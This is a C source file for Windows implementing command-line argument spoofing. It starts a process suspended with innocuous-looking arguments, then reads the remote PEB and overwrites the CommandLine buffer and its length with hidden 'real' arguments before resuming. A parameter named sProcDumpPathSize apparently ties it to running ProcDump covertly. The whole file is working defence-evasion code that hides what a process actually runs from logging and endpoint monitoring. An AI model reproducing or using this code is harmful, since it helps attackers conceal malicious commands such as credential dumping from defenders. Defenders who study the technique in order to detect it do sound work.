#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

#include "Debug.h"

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
	);

// Helper Function
// Read Data from remote process of handle `hProcess` from the address `pAddress` of size `dwBufferSize`
// output base address is saved in `ppReadBuffer` parameter 
BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {

	SIZE_T	sNmbrOfBytesRead = NULL;

	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

	if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize) {
#ifdef DEBUG
		printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Read : %d Of %d \n", sNmbrOfBytesRead, dwBufferSize);
#endif // DEBUG
		return FALSE;
	}

	return TRUE;
}

// Helper Function
// Write Data to remote process of handle `hProcess` at the address `pAddressToWriteTo`
// `pBuffer` is the data to be written of size `dwBufferSize`
BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {

	SIZE_T sNmbrOfBytesWritten = NULL;

	if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
#ifdef DEBUG
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Written : %d Of %d \n", sNmbrOfBytesWritten, dwBufferSize);
#endif // DEBUG
		return FALSE;
	}

	return TRUE;
}

/*

parameter:
	- szStartupArgs; the fake argument (these look legit) - or - it is just the process name
	- szRealArgs; the argument you want the process to actually run
	- sProcDumpPathSize; patching CommandLine.Length according to the legth of sProcDumpPathSize
	- dwProcessId & hProcess & hThread; output parameters - information on the created process
*/
BOOL CreateArgSpoofProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, IN DWORD sProcDumpPathSize, IN BOOL verboseMode, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	NTSTATUS						STATUS = NULL;

	WCHAR							szProcess[MAX_PATH];

	STARTUPINFOW					Si = { 0 };
	PROCESS_INFORMATION				Pi = { 0 };

	PROCESS_BASIC_INFORMATION		PBI = { 0 };
	ULONG							uRetern = NULL;

	PPEB							pPeb = NULL;
	PRTL_USER_PROCESS_PARAMETERS	pParms = NULL;
	wchar_t							currentDir[MAX_PATH];

	_wgetcwd(currentDir, MAX_PATH);


	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFOW);

	// getting the address of the `NtQueryInformationProcess` function
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL)
		return FALSE;

	lstrcpyW(szProcess, szStartupArgs);

	if (!CreateProcessW(
		NULL,
		szProcess,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		NULL,
		currentDir,
		&Si,
		&Pi)) {
#ifdef DEBUG
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
#endif // DEBUG
		return FALSE;
	}

#ifdef DEBUG
	printf("[i] Target Process Created With Pid : %d \n", Pi.dwProcessId);
#endif // DEBUG

	// getting the `PROCESS_BASIC_INFORMATION` structure of the remote process (that contains the peb address)
	if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
#ifdef DEBUG
		printf("[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	// reading the `peb` structure from its base address in the remote process
	if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
#ifdef DEBUG
		printf("[!] Failed To Read Target's Process Peb \n");
#endif // DEBUG
		return FALSE;
	}

	// reading the `ProcessParameters` structure from the peb of the remote process
	// we read extra `0xFF` bytes to insure we have reached the CommandLine.Buffer pointer
	// `0xFF` is 255, this can be whatever you like
	if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0x200)) {
#ifdef DEBUG
		printf("[!] Failed To Read Target's Process ProcessParameters \n");
#endif // DEBUG
		return FALSE;
	}

	// writing the parameter we want to run
#ifdef DEBUG
	if (verboseMode) {
		wprintf(L"[i] Writing \"%s\" As The Process Argument At : 0x%p ...\n", szRealArgs, pParms->CommandLine.Buffer);
	}

#endif // DEBUG
	if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
#ifdef DEBUG
		printf("[!] Failed To Write The Real Parameters\n");
#endif // DEBUG
		return FALSE;
	}

#ifdef DEBUG
	if (verboseMode) {
		wprintf(L"[i] Updating The Length Of The Process Argument From %d To %d ...\n\n", pParms->CommandLine.Length, sProcDumpPathSize);
	}
#endif // DEBUG
	if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&sProcDumpPathSize, sizeof(DWORD))) {
#ifdef DEBUG
		printf("[!] Failed To Update the Length Of The Process Argument\n");
#endif // DEBUG
		return FALSE;
	}

	// cleaning up
	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);

	// resuming the process with new paramters
	ResumeThread(Pi.hThread);

	// saving output parameters
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// checking if everything is valid
	if (*dwProcessId != NULL, *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}
